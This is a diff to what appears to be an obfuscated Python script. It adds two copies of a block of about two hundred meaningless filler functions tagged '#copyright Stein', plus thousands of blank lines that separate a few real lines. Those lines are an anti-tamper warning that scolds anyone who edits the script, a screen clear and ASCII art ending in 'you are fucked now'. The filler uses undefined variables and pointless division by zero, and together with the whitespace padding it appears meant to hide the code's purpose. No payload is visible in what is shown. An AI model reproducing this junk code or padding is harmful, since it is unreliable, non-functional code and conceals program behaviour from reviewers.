@@ -5685,6 +5685,789 @@ def managestate3():
 
 
 
+#copyright Stein
+def managedata58():
+    return y
+
+def processitem86():
+    x = random.randint(1, 100)
+
+def computeelement5():
+    return y
+
+def loaddata15():
+    data = {'key': 'value'}
+
+def handlestate65():
+    if x > random.randint(50, 100):
+        return z
+
+def computedata48():
+    return y
+
+def computeinfo50():
+    y = x + random.choice([3, 5, 7])
+
+def updatestate12():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def checkitem60():
+    data = {'key': 'value'}
+
+def handlestate57():
+    z = y * 2
+
+def setresult91():
+    data = {'key': 'value'}
+
+def managedata2():
+    x = random.randint(1, 100)
+
+def loadresult8():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def getinfo63():
+    return y
+
+def processlist56():
+    if x > random.randint(50, 100):
+        return z
+
+def computevalue75():
+    x = random.randint(1, 100)
+
+def managevalue63():
+    z = y * 2
+
+def computestatus75():
+    if x > random.randint(50, 100):
+        return z
+
+def loadvalue56():
+    if x > random.randint(50, 100):
+        return z
+
+def checkitem38():
+    if x > random.randint(50, 100):
+        return z
+
+def processconfig83():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def processstatus56():
+    for i in range(5):
+        y += i
+
+def setvalue95():
+    if x > random.randint(50, 100):
+        return z
+
+def handlestatus21():
+    data = {'key': 'value'}
+print("STEIN")
+def updatestatus62():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def setstate48():
+    y = x + random.choice([3, 5, 7])
+
+def updatestate59():
+    if x > random.randint(50, 100):
+        return z
+
+def manageresult5():
+    if x > random.randint(50, 100):
+        return z
+
+def processresult52():
+    return y
+
+def computeresult12():
+    data = {'key': 'value'}
+
+def managelist70():
+    y = x + random.choice([3, 5, 7])
+
+def handleresult89():
+    if x > random.randint(50, 100):
+        return z
+
+def handlestatus91():
+    x = random.randint(1, 100)
+
+def managestatus39():
+    y = x + random.choice([3, 5, 7])
+
+def setstatus37():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def updateelement21():
+    y = x + random.choice([3, 5, 7])
+
+def processvalue92():
+    if x > random.randint(50, 100):
+        return z
+
+def checkdata22():
+    x = random.randint(1, 100)
+
+def computeinfo56():
+    for i in range(5):
+        y += i
+
+def loadvalue20():
+    x = random.randint(1, 100)
+
+def setresult76():
+    if x > random.randint(50, 100):
+        return z
+
+def updateitem11():
+    data = {'key': 'value'}
+
+def updatestate20():
+    if x > random.randint(50, 100):
+        return z
+
+def loadstate29():
+    x = random.randint(1, 100)
+
+def processelement57():
+    for i in range(5):
+        y += i
+
+def computelist17():
+    for i in range(5):
+        y += i
+
+def setitem93():
+    z = y * 2
+
+def setconfig72():
+    if x > random.randint(50, 100):
+        return z
+
+def manageresult41():
+    y = x + random.choice([3, 5, 7])
+
+def updateitem34():
+    z = y * 2
+
+def updateconfig32():
+    return y
+
+def setstatus25():
+    for i in range(5):
+        y += i
+
+def processstate70():
+    for i in range(5):
+        y += i
+
+def handlestate23():
+    data = {'key': 'value'}
+
+def getitem40():
+    y = x + random.choice([3, 5, 7])
+
+def getitem61():
+    for i in range(5):
+        y += i
+
+def updatestate51():
+    x = random.randint(1, 100)
+
+def checkstate4():
+    y = x + random.choice([3, 5, 7])
+
+def managestatus88():
+    return y
+
+def manageinfo13():
+    data = {'key': 'value'}
+
+def handledata13():
+    x = random.randint(1, 100)
+
+def manageconfig25():
+    return y
+
+def getstate13():
+    x = random.randint(1, 100)
+
+def setvalue34():
+    data = {'key': 'value'}
+
+def loadresult61():
+    return y
+
+def checkresult49():
+    z = y * 2
+
+def computeelement12():
+    x = random.randint(1, 100)
+
+def getlist81():
+    return y
+
+def processvalue9():
+    data = {'key': 'value'}
+
+def computeelement58():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def getlist13():
+    for i in range(5):
+        y += i
+
+def processinfo6():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def processinfo71():
+    for i in range(5):
+        y += i
+
+def handlestate10():
+    z = y * 2
+
+def processelement47():
+    return y
+
+def getelement35():
+    x = random.randint(1, 100)
+
+def getitem72():
+    return y
+
+def managestate22():
+    x = random.randint(1, 100)
+
+def getresult86():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def managevalue42():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def updateconfig23():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def loaditem38():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def loaddata88():
+    for i in range(5):
+        y += i
+
+def setlist82():
+    x = random.randint(1, 100)
+
+def loadelement37():
+    data = {'key': 'value'}
+
+def handleresult2():
+    for i in range(5):
+        y += i
+
+def updatelist25():
+    x = random.randint(1, 100)
+
+def setitem88():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def updatelist18():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def updatestate67():
+    y = x + random.choice([3, 5, 7])
+
+def processitem4():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def processinfo90():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def updatevalue81():
+    x = random.randint(1, 100)
+
+def computestate17():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def setstatus58():
+    z = y * 2
+
+def getdata43():
+    return y
+
+def loaddata72():
+    if x > random.randint(50, 100):
+        return z
+
+def loadconfig88():
+    x = random.randint(1, 100)
+
+def managestatus59():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def handleconfig53():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def c(*args):
+    pass
+
+def updateitem14():
+    y = x + random.choice([3, 5, 7])
+
+def getconfig41():
+    x = random.randint(1, 100)
+
+def getresult2():
+    for i in range(5):
+        y += i
+
+def computestatus28():
+    if x > random.randint(50, 100):
+        return z
+
+def getlist20():
+    z = y * 2
+
+def managelist29():
+    return y
+
+def getstatus41():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def loadlist7():
+    y = x + random.choice([3, 5, 7])
+
+def processconfig82():
+    data = {'key': 'value'}
+
+def setresult66():
+    z = y * 2
+
+def loadstatus61():
+    z = y * 2
+
+def setlist31():
+    for i in range(5):
+        y += i
+
+def loadstate24():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def getdata77():
+    z = y * 2
+
+def getresult92():
+    for i in range(5):
+        y += i
+
+def getdata96():
+    if x > random.randint(50, 100):
+        return z
+
+def updatelist85():
+    z = y * 2
+
+def handleconfig30():
+    x = random.randint(1, 100)
+
+def checkconfig8():
+    for i in range(5):
+        y += i
+
+def getstatus3():
+    return y
+
+def loadresult2():
+    y = x + random.choice([3, 5, 7])
+
+def setlist80():
+    return y
+
+def setvalue20():
+    x = random.randint(1, 100)
+
+def setinfo95():
+    if x > random.randint(50, 100):
+        return z
+
+def processinfo34():
+    for i in range(5):
+        y += i
+
+def getinfo11():
+    return y
+
+def loadconfig93():
+    if x > random.randint(50, 100):
+        return z
+
+def processvalue26():
+    if x > random.randint(50, 100):
+        return z
+
+def loadinfo76():
+    data = {'key': 'value'}
+
+def checkelement51():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def handlestate7():
+    y = x + random.choice([3, 5, 7])
+
+def handlevalue60():
+    return y
+
+def handleelement28():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def getelement41():
+    z = y * 2
+
+def processelement93():
+    for i in range(5):
+        y += i
+
+def handledata93():
+    if x > random.randint(50, 100):
+        return z
+
+def computevalue81():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def updatedata76():
+    return y
+
+def getinfo2():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def handleinfo83():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def updateconfig64():
+    if x > random.randint(50, 100):
+        return z
+
+def updatedata62():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def computestatus37():
+    return y
+
+def getlist89():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def loadresult62():
+    for i in range(5):
+        y += i
+
+def computeelement16():
+    x = random.randint(1, 100)
+
+def processinfo97():
+    data = {'key': 'value'}
+
+def setinfo61():
+    return y
+
+def checkelement58():
+    if x > random.randint(50, 100):
+        return z
+
+def computelist80():
+    data = {'key': 'value'}
+
+def handledata5():
+    x = random.randint(1, 100)
+
+def loadresult86():
+    data = {'key': 'value'}
+
+def manageitem95():
+    x = random.randint(1, 100)
+
+def updateelement53():
+    x = random.randint(1, 100)
+
+def getelement91():
+    if x > random.randint(50, 100):
+        return z
+
+def processdata92():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def updatedata97():
+    data = {'key': 'value'}
+
+def checkvalue84():
+    y = x + random.choice([3, 5, 7])
+
+def computedata45():
+    y = x + random.choice([3, 5, 7])
+
+def computeconfig2():
+    data = {'key': 'value'}
+
+def handleinfo61():
+    if x > random.randint(50, 100):
+        return z
+
+def setitem79():
+    return y
+
+def getvalue47():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def setstate43():
+    for i in range(5):
+        y += i
+
+def checkelement68():
+    for i in range(5):
+        y += i
+
+def updateelement64():
+    return y
+
+def handleelement90():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def getinfo55():
+    return y
+
+def updateinfo81():
+    z = y * 2
+
+def loadresult44():
+    y = x + random.choice([3, 5, 7])
+
+def processresult32():
+    data = {'key': 'value'}
+
+def getinfo50():
+    x = random.randint(1, 100)
+
+def computedata68():
+    z = y * 2
+
+def checkstate21():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def getstate56():
+    y = x + random.choice([3, 5, 7])
+
+def handledata94():
+    for i in range(5):
+        y += i
+
+def updatelist88():
+    for i in range(5):
+        y += i
+
+def getconfig70():
+    data = {'key': 'value'}
+
+def updatestate25():
+    data = {'key': 'value'}
+
+def getstate2():
+    return y
+
+def setstate76():
+    for i in range(5):
+        y += i
+
+def getstatus81():
+    data = {'key': 'value'}
+
+def handleresult22():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def setitem44():
+    y = x + random.choice([3, 5, 7])
+
+def checkdata83():
+    y = x + random.choice([3, 5, 7])
+
+def processconfig60():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def updatevalue77():
+    y = x + random.choice([3, 5, 7])
+
+def getinfo73():
+    z = y * 2
+
+def managestatus25():
+    for i in range(5):
+        y += i
+
+def setdata14():
+    data = {'key': 'value'}
+
+def updatestate55():
+    z = y * 2
+
+def checkinfo13():
+    x = random.randint(1, 100)
+
+def computeresult12():
+    if x > random.randint(50, 100):
+        return z
+
+def checkstate43():
+    if x > random.randint(50, 100):
+        return z
+
+def updatelist95():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def computeresult32():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def computestatus23():
+    y = x + random.choice([3, 5, 7])
+
+def computeconfig3():
+    y = x + random.choice([3, 5, 7])
+
+def computeresult67():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def managestate3():
+    z = y * 2
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
@@ -6435,19 +7218,5843 @@ I am sorry brother but you are fucked now""")
 ⠀⠀⠀⠀⠀⠀⠀⠈⢻⣻⣻⣷⣤⣀⣀⣀⠄⢰⡟⠀⠱⠁⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⢀⣠⣤⣻⣻⣻⣻⣦⠤⠀⠀⠊⠀⢀⡆⢠⠀⠀⠀⠀⠀
 I am sorry brother but you are fucked now""")
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
         time.sleep(0.1)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
         os.system('cls' if os.name == 'nt' else 'clear')
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
     message = "Why you Tried to change the script? You know it don't work when you change things brother.\n\n"
     for char in message:
         sys.stdout.write(Fore.YELLOW + char if char in '.,!?' else Fore.CYAN + char)
         sys.stdout.flush()
         time.sleep(0.1)
     print()
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+#copyright Stein
+def managedata58():
+    return y
+
+def processitem86():
+    x = random.randint(1, 100)
+
+def computeelement5():
+    return y
+
+def loaddata15():
+    data = {'key': 'value'}
+
+def handlestate65():
+    if x > random.randint(50, 100):
+        return z
+
+def computedata48():
+    return y
+
+def computeinfo50():
+    y = x + random.choice([3, 5, 7])
+
+def updatestate12():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def checkitem60():
+    data = {'key': 'value'}
+
+def handlestate57():
+    z = y * 2
+
+def setresult91():
+    data = {'key': 'value'}
+
+def managedata2():
+    x = random.randint(1, 100)
+
+def loadresult8():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def getinfo63():
+    return y
+
+def processlist56():
+    if x > random.randint(50, 100):
+        return z
+
+def computevalue75():
+    x = random.randint(1, 100)
+
+def managevalue63():
+    z = y * 2
+
+def computestatus75():
+    if x > random.randint(50, 100):
+        return z
+
+def loadvalue56():
+    if x > random.randint(50, 100):
+        return z
+
+def checkitem38():
+    if x > random.randint(50, 100):
+        return z
+
+def processconfig83():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def processstatus56():
+    for i in range(5):
+        y += i
+
+def setvalue95():
+    if x > random.randint(50, 100):
+        return z
+
+def handlestatus21():
+    data = {'key': 'value'}
+print("STEIN")
+def updatestatus62():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def setstate48():
+    y = x + random.choice([3, 5, 7])
+
+def updatestate59():
+    if x > random.randint(50, 100):
+        return z
+
+def manageresult5():
+    if x > random.randint(50, 100):
+        return z
+
+def processresult52():
+    return y
+
+def computeresult12():
+    data = {'key': 'value'}
+
+def managelist70():
+    y = x + random.choice([3, 5, 7])
+
+def handleresult89():
+    if x > random.randint(50, 100):
+        return z
+
+def handlestatus91():
+    x = random.randint(1, 100)
+
+def managestatus39():
+    y = x + random.choice([3, 5, 7])
+
+def setstatus37():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def updateelement21():
+    y = x + random.choice([3, 5, 7])
+
+def processvalue92():
+    if x > random.randint(50, 100):
+        return z
+
+def checkdata22():
+    x = random.randint(1, 100)
+
+def computeinfo56():
+    for i in range(5):
+        y += i
+
+def loadvalue20():
+    x = random.randint(1, 100)
+
+def setresult76():
+    if x > random.randint(50, 100):
+        return z
+
+def updateitem11():
+    data = {'key': 'value'}
+
+def updatestate20():
+    if x > random.randint(50, 100):
+        return z
+
+def loadstate29():
+    x = random.randint(1, 100)
+
+def processelement57():
+    for i in range(5):
+        y += i
+
+def computelist17():
+    for i in range(5):
+        y += i
+
+def setitem93():
+    z = y * 2
+
+def setconfig72():
+    if x > random.randint(50, 100):
+        return z
+
+def manageresult41():
+    y = x + random.choice([3, 5, 7])
+
+def updateitem34():
+    z = y * 2
+
+def updateconfig32():
+    return y
+
+def setstatus25():
+    for i in range(5):
+        y += i
+
+def processstate70():
+    for i in range(5):
+        y += i
+
+def handlestate23():
+    data = {'key': 'value'}
+
+def getitem40():
+    y = x + random.choice([3, 5, 7])
+
+def getitem61():
+    for i in range(5):
+        y += i
+
+def updatestate51():
+    x = random.randint(1, 100)
+
+def checkstate4():
+    y = x + random.choice([3, 5, 7])
+
+def managestatus88():
+    return y
+
+def manageinfo13():
+    data = {'key': 'value'}
+
+def handledata13():
+    x = random.randint(1, 100)
+
+def manageconfig25():
+    return y
+
+def getstate13():
+    x = random.randint(1, 100)
+
+def setvalue34():
+    data = {'key': 'value'}
+
+def loadresult61():
+    return y
+
+def checkresult49():
+    z = y * 2
+
+def computeelement12():
+    x = random.randint(1, 100)
+
+def getlist81():
+    return y
+
+def processvalue9():
+    data = {'key': 'value'}
+
+def computeelement58():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def getlist13():
+    for i in range(5):
+        y += i
+
+def processinfo6():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def processinfo71():
+    for i in range(5):
+        y += i
+
+def handlestate10():
+    z = y * 2
+
+def processelement47():
+    return y
+
+def getelement35():
+    x = random.randint(1, 100)
+
+def getitem72():
+    return y
+
+def managestate22():
+    x = random.randint(1, 100)
+
+def getresult86():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def managevalue42():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def updateconfig23():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def loaditem38():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def loaddata88():
+    for i in range(5):
+        y += i
+
+def setlist82():
+    x = random.randint(1, 100)
+
+def loadelement37():
+    data = {'key': 'value'}
+
+def handleresult2():
+    for i in range(5):
+        y += i
+
+def updatelist25():
+    x = random.randint(1, 100)
+
+def setitem88():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def updatelist18():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def updatestate67():
+    y = x + random.choice([3, 5, 7])
+
+def processitem4():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def processinfo90():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def updatevalue81():
+    x = random.randint(1, 100)
+
+def computestate17():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def setstatus58():
+    z = y * 2
+
+def getdata43():
+    return y
+
+def loaddata72():
+    if x > random.randint(50, 100):
+        return z
+
+def loadconfig88():
+    x = random.randint(1, 100)
+
+def managestatus59():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def handleconfig53():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def c(*args):
+    pass
+
+def updateitem14():
+    y = x + random.choice([3, 5, 7])
+
+def getconfig41():
+    x = random.randint(1, 100)
+
+def getresult2():
+    for i in range(5):
+        y += i
+
+def computestatus28():
+    if x > random.randint(50, 100):
+        return z
+
+def getlist20():
+    z = y * 2
+
+def managelist29():
+    return y
+
+def getstatus41():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def loadlist7():
+    y = x + random.choice([3, 5, 7])
+
+def processconfig82():
+    data = {'key': 'value'}
+
+def setresult66():
+    z = y * 2
+
+def loadstatus61():
+    z = y * 2
+
+def setlist31():
+    for i in range(5):
+        y += i
+
+def loadstate24():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def getdata77():
+    z = y * 2
+
+def getresult92():
+    for i in range(5):
+        y += i
+
+def getdata96():
+    if x > random.randint(50, 100):
+        return z
+
+def updatelist85():
+    z = y * 2
+
+def handleconfig30():
+    x = random.randint(1, 100)
+
+def checkconfig8():
+    for i in range(5):
+        y += i
+
+def getstatus3():
+    return y
+
+def loadresult2():
+    y = x + random.choice([3, 5, 7])
+
+def setlist80():
+    return y
+
+def setvalue20():
+    x = random.randint(1, 100)
+
+def setinfo95():
+    if x > random.randint(50, 100):
+        return z
+
+def processinfo34():
+    for i in range(5):
+        y += i
+
+def getinfo11():
+    return y
+
+def loadconfig93():
+    if x > random.randint(50, 100):
+        return z
+
+def processvalue26():
+    if x > random.randint(50, 100):
+        return z
+
+def loadinfo76():
+    data = {'key': 'value'}
+
+def checkelement51():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def handlestate7():
+    y = x + random.choice([3, 5, 7])
+
+def handlevalue60():
+    return y
+
+def handleelement28():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def getelement41():
+    z = y * 2
+
+def processelement93():
+    for i in range(5):
+        y += i
+
+def handledata93():
+    if x > random.randint(50, 100):
+        return z
+
+def computevalue81():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def updatedata76():
+    return y
+
+def getinfo2():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def handleinfo83():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def updateconfig64():
+    if x > random.randint(50, 100):
+        return z
+
+def updatedata62():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def computestatus37():
+    return y
+
+def getlist89():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def loadresult62():
+    for i in range(5):
+        y += i
+
+def computeelement16():
+    x = random.randint(1, 100)
+
+def processinfo97():
+    data = {'key': 'value'}
+
+def setinfo61():
+    return y
+
+def checkelement58():
+    if x > random.randint(50, 100):
+        return z
+
+def computelist80():
+    data = {'key': 'value'}
+
+def handledata5():
+    x = random.randint(1, 100)
+
+def loadresult86():
+    data = {'key': 'value'}
+
+def manageitem95():
+    x = random.randint(1, 100)
+
+def updateelement53():
+    x = random.randint(1, 100)
+
+def getelement91():
+    if x > random.randint(50, 100):
+        return z
+
+def processdata92():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def updatedata97():
+    data = {'key': 'value'}
+
+def checkvalue84():
+    y = x + random.choice([3, 5, 7])
+
+def computedata45():
+    y = x + random.choice([3, 5, 7])
+
+def computeconfig2():
+    data = {'key': 'value'}
+
+def handleinfo61():
+    if x > random.randint(50, 100):
+        return z
+
+def setitem79():
+    return y
+
+def getvalue47():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def setstate43():
+    for i in range(5):
+        y += i
+
+def checkelement68():
+    for i in range(5):
+        y += i
+
+def updateelement64():
+    return y
+
+def handleelement90():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def getinfo55():
+    return y
+
+def updateinfo81():
+    z = y * 2
+
+def loadresult44():
+    y = x + random.choice([3, 5, 7])
+
+def processresult32():
+    data = {'key': 'value'}
+
+def getinfo50():
+    x = random.randint(1, 100)
+
+def computedata68():
+    z = y * 2
+
+def checkstate21():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def getstate56():
+    y = x + random.choice([3, 5, 7])
+
+def handledata94():
+    for i in range(5):
+        y += i
+
+def updatelist88():
+    for i in range(5):
+        y += i
+
+def getconfig70():
+    data = {'key': 'value'}
+
+def updatestate25():
+    data = {'key': 'value'}
+
+def getstate2():
+    return y
